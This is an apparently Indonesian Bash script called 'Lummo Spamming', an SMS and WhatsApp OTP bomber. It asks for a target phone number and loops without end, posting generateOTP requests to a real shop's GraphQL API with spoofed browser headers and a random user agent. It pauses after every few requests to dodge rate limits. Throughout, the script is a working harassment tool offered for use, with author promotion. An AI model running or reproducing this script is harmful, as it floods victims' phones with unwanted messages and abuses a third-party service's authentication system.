#!/usr/bin/env bash

# note
<< EOF

semua code di dalam script ini di rancang oleh Bayu Riski A.M
di larang merubah source ini sebelum ijin kepada author nya

komunitas : t.me/BashShell
oficial   : t.me/SpeedrunOFC

dan subscribe juga channel youtube saya [pejuang kentang]

# LICENSE
MIT License

Copyright (c) 2022 Bash programmer

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

EOF

# author  : speedrun
# github  : https://github.com/Speedrun-bash
# youtube : pejuang kentang

# jangan lupa subscribe pejuang kentang ya gan ^_^

# plugins bash moderen
. lib/moduler.sh
# depencies
Bash.import: text_display/colorama text_display/IO.ECHO
Bash.import: util/io.class util/IO.FUNC
Bash.import: util/operator util/IO.SYSTEM.var
Bash.import: fake_useragent/HTTP.UA

@require modules/pack.sh

class __main__; {
	public: app = sms; %% metode sms
	public: app = wa; %% metode wa
}; {
	def: __main__::sms(){
		global: no = "$@"
		global: ua = $(Bash::Ua.Random)
		
		declare heders=(
			"host: api.tokko.io"
			"content-type: application/json"
			"origin: https://web.lummoshop.com"
			"referer: https://web.lummoshop.com/"
			"sec-fetch-site: cross-site"
			"user-agent: ${ua}"
			"x-tokko-api-client: merchant_web"
			"x-tokko-api-client-version: 4.1.1"
		); var req : $(curl -sL -H "${heders[0]}" -H "${heders[1]}" -H "${heders[2]}" -H "${heders[3]}" -H "${heders[4]}" -H "${heders[5]}" -H "${heders[6]}" -H "${heders[7]}" --url "https://api.tokko.io/graphql" -X POST -d '{"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"'"${no}"'","hashCode":"","channel":"SMS","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"}')

		var waktu : $(date +%H:%M:%S)
		if ! (ambil: req in "errors" &> /dev/null); then
			Tulis.strN "${ku}[${pu}${waktu}${ku}]${st} ${bg_cy}Bot info${st}${pu} \tspamming to ${ku}${no} ${ij}V"
			Tulis.strN "${me}[${pu}${waktu}${me}]${st} ${bg_ij}bot note${st}${me} \tevery 4 times spam will cause a colddown ( which aims to avoid the web so as not to sulk ;V )"
			Tulis.strN "${cy}[${pu}${waktu}${cy}]${st} ${bg_me}message${st}${pu}  \tsubscribe pejuang kentang${st}\n"
		else
			Tulis.strN "${ku}[${pu}${waktu}${ku}]${st} ${bg_cy}Bot info${st}${pu} \tspamming to ${ku}${no} ${me}X${st}"
		    Tulis.strN "${me}[${pu}${waktu}${me}]${st} ${bg_ij}bot note${st}${me} \tevery 4 times spam will cause a colddown ( which aims to avoid the web so as not to sulk ;V )"
			Tulis.strN "${cy}[${pu}${waktu}${cy}]${st} ${bg_me}message${st}${pu}  \tsubscribe pejuang kentang${st}\n"
		fi
	}
        def: __main__::wa(){
                global: no = "$@"
                global: ua = $(Bash::Ua.Random)

                declare heders=(
                        "host: api.tokko.io"
                        "content-type: application/json"
                        "origin: https://web.lummoshop.com"
                        "referer: https://web.lummoshop.com/"
                        "sec-fetch-site: cross-site"
                        "user-agent: ${ua}"
                        "x-tokko-api-client: merchant_web"
                        "x-tokko-api-client-version: 4.1.1"
                ); var req : $(curl -sL -H "${heders[0]}" -H "${heders[1]}" -H "${heders[2]}" -H "${heders[3]}" -H "${heders[4]}" -H "${heders[5]}" -H "${heders[6]}" -H "${heders[7]}" --url "https://api.tokko.io/graphql" -X POST -d '{"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"'"${no}"'","hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"}')
				var waktu : $(date +%H:%M:%S);
				
                if ! (ambil: req in "errors" &> /dev/null); then
                        Tulis.strN "${ku}[${pu}${waktu}${ku}]${st} ${bg_cy}bot info${st}${pu} \tspamming to ${ku}${no} ${ij}V"
                        Tulis.strN "${me}[${pu}${waktu}${me}]$st ${bg_ij}bot note${st}${me} \tevery 2 times spam will cause a colddown ( which aims to avoid the web so as not to sulk ;V )"
                		Tulis.strN "${cy}[${pu}${waktu}${cy}]$st ${bg_me}message${st}${pu}  \tsubscribe pejuang kentang${st}\n"
                	elif (ambil: req in "errors" &> /dev/null); then
                       Tulis.strN "${ku}[${pu}${waktu}${ku}]$st ${bg_cy}bot info${st}${pu} \tspamming to ${ku}${no} ${me}X"
                       Tulis.strN "${me}[${pu}${waktu}${me}]$st ${bg_ij}bot note${st}${me} \tevery 4 times spam will cause a colddown ( which aims to avoid the web so as not to sulk ;V )"
                       Tulis.strN "${cy}[${pu}${waktu}${cy}]$st ${bg_me}message${st}${me}  \tsubscribe pejuang kentang${st}\n"
                    elif (test -z "$req"); then
                    	 Tulis.strN "${ku}[${pu}${waktu}${ku}]$st ${bg_cy}bot info${st}${pu} \tspamming to ${ku}${no} ${me}X${ku} (${ij}please check your internet${ku})${st}"
                    	 Tulis.strN "${me}[${pu}${waktu}${me}]$st ${bg_ij}bot note${st}${me} \tevery 4 times spam will cause a colddown ( which aims to avoid the web so as not to sulk ;V )"
                    	 Tulis.strN "${cy}[${pu}${waktu}${cy}]$st ${bg_me}message${st}${pu}  \tsubscribe pejuang kentang${st}\n"
                    fi
        }
}; class.new: __main__ mode


def: delay(){
	global: text = "$@";
	var fr : "/_\|";
	var j : 0;
	
	for ((i = 60; i <= i; i--)); do
		let j++;

		if (test "$j" == 4); then
			var j : 0;
		fi
		sleep 1s
		printf "\r${pu}${text} ${ij}(${me}${i}${ij})${bi} %s ${st}" "${fr:j:1}"

		if ((i == 0)); then
			break
		fi
	done	 
}; var times : $(date +%H:%M:%S)

def: gas(){
	(clear); {
		var gasken : 1;
		var selesai : 53;

		for ((column = gasken; column <= selesai; column++)); do
			if ((column == gasken)); then
				declare abc+="(~)"
			elif ((column == selesai)); then
				declare abc+="(~)"
			elif ((column == $((selesai / 2)) + 1)); then
				declare abc+="(~)"
			elif ((column > 1)); then
				declare abc+="-"
			fi
		done

		declare honda[1]="$cy"
		declare honda[2]="$ku"
		declare honda[3]="$hi"
		declare honda[4]="$m"

		var susuki : $(shuf -i 1-4 -n 1);
		var supra : $(shuf -i 1-3 -n 1);
		
		Tulis.str "$ij"
		toilet -f slant "Lummo evil";
		Tulis.str "$st"
		Tulis.strN "\t\t   ${honda[$susuki]}Lummo ${honda[$supra]}Spamming"
		echo
		Tulis.strN "${ku}> ${cy}server   ${me}: ${pu}${bg_cy}lummo shop${st}"
		Tulis.strN "${m}> ${cy}language ${me}: ${pu}${bg_me}Bash${st}"
		echo -e "${ij}$abc"
		Tulis.strN "${ku}|\t${ij}~${me}>${cy} author  ${me}:${pu} speedrun                             ${ku}|"
		Tulis.strN "${ku}|\t${ij}~${me}>${ij} youtube ${me}:${pu} pejuang kentang                      ${ku}| "
		Tulis.strN "${ku}|\t${ij}~${me}>${ku} github  ${me}:${pu} Speedrun-bash && Bayu12345677        ${ku}|"
		echo -e "${ij}$abc${st}"
		echo
		Tulis.strN "${me}1${m}.${ku} server ${ij}(${me}sms${ij})"
		Tulis.strN "${me}2${m}.${cy} server ${ij}(${me}whatsapp${ij})"
		echo
		Tulis.str "${ij}[${bi}#${ij}]${ku}(${me}master${ku})${cy}> ${st}"; read send; echo

		if (test -z "$send"); then
			Tulis.strN "${me}[${ku}${times}${me}]${pu} ${bg_cy}Bot info${st}${pu} \tinput not found${st}"
			Tulis.strN "${cy}[${ku}${times}${cy}]${pu} ${bg_me}message${st}${ku}  \tPlease fill input${st}";
			echo
			exit
		fi
		if [[ "$send" =~ [0-9]$ ]]; then
			var dummy : ""
		else
			Tulis.strN "${me}[${pu}${times}${me}]${st}${bg_cy} Bot info${st}${pu} \tinvalid input"
			Tulis.strN "${cy}[${pu}${times}${cy}]${st}${bg_ij} Bot info${st}${ku} \tinput must be a number${st}"
			echo
			exit
		fi
		
		if ((send == 1)); then
			clear; echo
			Tulis.strN "${cy}*${m} date${ij}   \t$(date)"
			Tulis.strN "${ij}*${me} server${bi} \tlummo shop"
			Tulis.strN "${me}*${cy} metode${pu} \tsms"
			echo
			Tulis.str "${ij}(${bg_me}target${st}${ij})${m}> ${st}"; read te
			echo

			if [[ -z "$te" ]]; then
				Tulis.strN "${cy}[${pu}${times}${cy}]${bg_cy} Bot info${st}${pu} \tinput not found"
                Tulis.strN "${ku}[${pu}${times}${ku}]${st}${bg_me} message${st}${ku} \tPlease fill input${st}";
                echo
                exit
            fi

			if [[ "$te" =~ [0-9]$ ]]; then
				dummy=
			else
                Tulis.strN "${me}[${pu}${times}${me}]${st}${bg_cy} Bot info${st}${pu} \tinvalid input${st}"
                Tulis.strN "${cy}[${pu}${times}${cy}]${st}${bg_ij} Bot info${st}${ku} \tinput must be a number${st}"
                echo
                exit
            fi
            
			if [[ "${te:0:3}" == "+62" ]]; then
				var regex_nomer : "$te"
			elif [[ "${te:0:2}" == 08 ]]; then
				var regex_nomer : "+62${te:1:15}"
			elif [[ "${te:0:1}" == 8 ]]; then
				var regex_nomer : "+62${te}"
			elif [[ "${te:0:2}" == 62 ]]; then
				var regex_nomer : "+${te}"
			fi

			var o : 0
			while true; do
				var times : $(date +%H:%M:%S)
				let o++

				mode.sms "${regex_nomer}"
				if ((o == 2)); then
					var o : 0
					echo
					delay "please wait"
					echo; echo
				fi
			done
			
		elif ((send == 2)); then
                        clear; echo
                        Tulis.strN "${cy}*${me} date ${hi}  \t$(date)"
                        Tulis.strN "${me}*${cy} server${pu} \tlummo shop"
                        Tulis.strN "${ij}*${me} metode${pu} \twhatsapp"
                        echo
                        Tulis.str "${ij}(${me}target${ij})${m}> ${st}"; read te
                        echo

                        if [[ -z "$te" ]]; then
                                Tulis.strN "${me}[${pu}${times}${me}]${st}${bg_cy} Bot info${st}${pu} \tinput not found"
                				Tulis.strN "${cy}[${pu}${times}${cy}]${st}${bg_me} message${st}${ku} \tPlease fill input${st}";
                				echo
                				exit
            			fi

                        if [[ "$te" =~ [0-9]$ ]]; then
                        	dummy=
                        else
                        	Tulis.strN "${ku}[${pu}${times}${ku}]${st}${bg_cy} Bot info \tinvalid input"
                        	Tulis.strN "${me}[${pu}${times}${me}]${st}${bg_ij} Bot info \tinput must be a number${st}"
                      	    echo
                        	exit
            			fi

                        if [[ "${te:0:3}" == "+62" ]]; then
                                var regex_nomer : "$te"
                        elif [[ "${te:0:2}" == 08 ]]; then
                                var regex_nomer : "+62${te:1:15}"
                        elif [[ "${te:0:1}" == 8 ]]; then
                                var regex_nomer : "+62${te}"
                        elif [[ "${te:0:2}" == 62 ]]; then
                                var regex_nomer : "+${te}"
                        fi

						let o=0
                        for ((i = 0; i <= i; i++)); do
                        	let o++

							mode.wa "$regex_nomer"
                        	if ((o == 2)); then
                        		echo
                        		var o : 0
                        		delay "Please wait"
                        		echo
                        		echo
                        	fi
                        done
                        		
       		fi
	}
};{
	clear;
	declare colors=();

	colors[1]="${ku}"
	colors[2]="${cy}"
	colors[3]="${ij}"
	colors[4]="${hi}"

	let limit=9
	let count=0
	let model=0

	for x in {1..1}; do
		for ((i = count; i <= limit; i++)); do
	
			let model++
		
			if ((model == 1)); then
				var sys_colors : "${colors[1]}"
				var sys_warna : "${colors[4]}"
				var app_symb : "-"
			elif ((model == 2)); then
				var sys_colors : "${colors[2]}"
				var sys_warna : "${colors[3]}"
				var app_symb : "^"
			elif ((model == 3)); then
				var sys_colors : "${colors[3]}"
				var sys_warna : "${colors[2]}"
				var app_symb : "/"
			elif ((model == 4)); then
				let model=0
				var sys_colors : "${colors[4]}"
				var sys_warna : "${colors[1]}"
				var app_symb : "#"
			fi

			sleep 01
			printf "\r${pu}subscribe pejuang kentang ${sys_colors}${app_symb}${st}_${sys_warna}'${st}"
		done
	done; sleep 1
		xdg-open https://www.youtube.com/channel/UCtu-GcxKL8kJBXpR1wfMgWg/
	call:- gas "->" __main__
	
  }
